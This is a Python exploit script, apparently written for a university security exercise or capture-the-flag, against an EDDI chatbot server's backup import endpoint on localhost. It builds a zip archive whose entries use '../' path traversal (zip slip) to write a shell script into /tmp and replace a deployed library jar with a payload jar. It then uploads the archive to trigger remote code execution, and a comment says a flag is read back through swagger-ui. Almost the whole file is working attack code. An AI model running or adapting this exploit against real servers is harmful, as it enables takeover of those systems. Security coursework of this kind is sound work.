import zipfile
import requests
import shutil

sess = requests.Session()
HOST = "http://localhost:7070"

# Add jar with payload and `exploit.sh` to `exported.zip`
filename_jar = r"C:\Users\nikba\Desktop\roba\uni\sse\EDDI_JDK17\VulnerabilityUse\org.eclipse.microprofile.openapi.microprofile-openapi-api-3.1.jar"

target_filename_jar = '/deployments/lib/main/org.eclipse.microprofile.openapi.microprofile-openapi-api-3.1.jar'

filename_exploit = r"C:\Users\nikba\Desktop\roba\uni\sse\EDDI_JDK17\VulnerabilityUse\RCE\exploit.sh"
target_filename_exploit = '/tmp/exploit.sh'

exported_zip = r"C:\Users\nikba\Downloads\Party+bot-683a9c5edbf5e9600da18d00-1.zip"
exploit_zip = r"C:\Users\nikba\Downloads\Party+bot-exploit.zip"
shutil.copy(exported_zip, exploit_zip)

with zipfile.ZipFile(exploit_zip, "a") as zf:
    zf.writestr('../../../..' + target_filename_exploit, open(filename_exploit, 'rb').read())
    zf.writestr('../../../..' + target_filename_jar, open(filename_jar, 'rb').read())

# First request - Ensure the subdirectories in /tmp/vertx-cache/ are created, so we can exfil the flag there
r = sess.get(f"{HOST}/q/swagger-ui/")
print("First:", r.status_code)

# Second request - file upload. Trigger zip slip and code execution in same request
r = sess.post(f"{HOST}/backup/import", data=open(exploit_zip, "rb"), headers={"Content-Type": "application/zip"})
print("Second:", r.status_code)

# now we can read the content of pwn.out by http://localhost:7070/q/swagger-ui/pwn.out

